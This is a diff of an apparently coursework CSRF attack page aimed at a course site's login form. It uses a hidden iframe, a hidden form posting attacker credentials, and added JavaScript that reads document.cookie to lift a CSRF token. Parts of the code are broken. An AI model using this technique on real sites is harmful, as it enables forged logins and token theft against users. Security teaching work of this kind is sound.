@@ -7,7 +7,7 @@
 <body>
 <iframe id="ecen" src="http://ecen5032.org" style="visibility: hidden;"></iframe>
 <form name="myForm" id="myForm"  action="http://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0&" target="ecen">
-	<input type="hidden" name="csrf_token" value = document.cookie.split(";")[2].substr(document.cookie.split(";")[2].indexOf("="),document.cookie.split(";")[2].length)/>
+	<input type="hidden" name="csrf_token" value = goods/>
 	<input type="hidden" name="username" value="attacker"/>
 	<input type="hidden" name="password" value="l33th4x"/>
 	 <!-- console.log(decodeURIComponent(document.cookie)) -->
@@ -18,6 +18,21 @@ window.onload = function func(){
  	form = document.getElementById('myForm');
  	    function postIframe(target_url, method, pform)
     {
+				// gather the cookie value
+				var iframe = document.createElement("iframe");
+				document.body.appendChild(iframe);
+        iframe.style.display = "none";
+				var frame_name = "myIframe"
+				iframe.contentWindow.name = frame_name;
+
+
+				document.getElementById('myIframe').src = 'http://ecen5032.org/project2/login?csrfdefense=1&xssdefense=0&';
+
+
+				var goods=document.cookie.split(';')[2].substr(document.cookie.split(';')[2].indexOf('='),document.cookie.split(';')[2].length);
+				// console.log(goods);
+				// window.history.back();
+
         //Add iframe
         var iframe = document.createElement("iframe");
         document.body.appendChild(iframe);
